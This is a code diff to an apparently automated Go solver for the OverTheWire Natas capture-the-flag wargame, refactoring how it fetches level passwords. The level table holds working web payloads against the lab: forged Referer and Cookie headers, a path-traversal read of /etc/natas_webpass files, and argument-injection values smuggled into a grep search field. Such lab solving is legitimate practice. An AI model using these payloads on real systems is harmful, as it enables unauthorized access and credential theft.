@@ -42,12 +42,12 @@ func (p Prefixed) Grab(r http.Request) string {
 
 type Path struct {
 	Grabber
-	Path string
+	Path Grabber
 }
 
 func (p Path) Grab(r http.Request) string {
 	oldPath := r.URL.Path
-	r.URL.Path = p.Path
+	r.URL.Path = p.Path.Grab(r)
 	s := p.Grabber.Grab(r)
 	r.URL.Path = oldPath
 	return s
@@ -135,23 +135,6 @@ func (b Base64Decode) Grab(r http.Request) string {
 	return string(res)
 }
 
-type Cookie struct {
-	Name string
-}
-
-func (c Cookie) Grab(r http.Request) string {
-	r.Method = http.MethodHead
-	resp, err := http.DefaultClient.Do(&r)
-	e(err)
-	cookies := resp.Cookies()
-	for _, cookie := range cookies {
-		if cookie.Name == c.Name {
-			return cookie.Value
-		}
-	}
-	panic(errors.Error("could not find cookie"))
-}
-
 type SetData map[string]Grabber
 
 type Setter interface {
@@ -172,16 +155,33 @@ func (t Text) Grab(http.Request) string {
 	return t.Text
 }
 
+type Cookie struct {
+	Name string
+}
+
+func (c Cookie) Grab(r http.Request) string {
+	r.Method = http.MethodHead
+	resp, err := http.DefaultClient.Do(&r)
+	e(err)
+	cookies := resp.Cookies()
+	for _, cookie := range cookies {
+		if cookie.Name == c.Name {
+			return cookie.Value
+		}
+	}
+	panic(errors.Error("could not find cookie"))
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
-	Path{Prefixed{"natas3:", 32}, "/files/users.txt"},  // image @ /files/pixel.png, go to folder, find users.txt
-	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
+	Path{Prefixed{"natas3:", 32}, Text{"/files/users.txt"}},  // image @ /files/pixel.png, go to folder, find users.txt
+	Path{Prefixed{"natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
 	Headers{Prefixed{"The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
 	Headers{Prefixed{"The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
-	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}}},
+	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, Text{"/includes/secret.inc"}}}},
 	Get{Prefixed{"<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
-	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}}}}},
+	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}},
 	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
 	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
 }
